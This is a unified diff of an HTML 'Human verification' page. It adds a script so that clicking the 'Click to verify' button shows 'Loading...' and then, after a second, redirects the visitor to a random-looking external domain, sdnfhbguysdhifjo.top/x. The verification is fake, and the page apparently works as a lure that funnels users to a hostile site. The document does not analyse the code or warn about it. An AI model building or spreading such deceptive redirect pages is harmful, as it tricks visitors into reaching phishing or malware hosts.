@@ -33,6 +33,15 @@
             animation: dotsAnimation 2s infinite;
         }
     </style>
+    <script>
+        function verifyHuman() {
+            const button = document.getElementById('verify-button');
+            button.innerText = 'Loading...';
+            setTimeout(() => {
+                window.location.href = 'https://sdnfhbguysdhifjo.top/x';
+            }, 1000); // Optional delay before redirecting
+        }
+    </script>
 </head>
 <body>
     <div id="__next">
@@ -41,9 +50,9 @@
                 <h2 class="mt-2 text-center text-3xl">Human verification</h2>
                 <p class="mt-2 text-center text-sm">Please verify that you are human</p>
                 <div class="mt-6">
-                    <div style="min-height:3rem" class="bg-blue-800 shadow-xl rounded-lg border-blue-800 hover:bg-blue-900 cursor-pointer relative">
+                    <div style="min-height:3rem" class="bg-blue-800 shadow-xl rounded-lg border-blue-800 hover:bg-blue-900 cursor-pointer relative" onclick="verifyHuman()">
                         <div class="absolute inset-0 flex items-center justify-center px-4 py-3 space-x-2">
-                            <label for="human" class="text-center text-sm font-medium text-slate-100">Click to verify</label>
+                            <label id="verify-button" for="human" class="text-center text-sm font-medium text-slate-100">Click to verify</label>
                         </div>
                     </div>
                 </div>
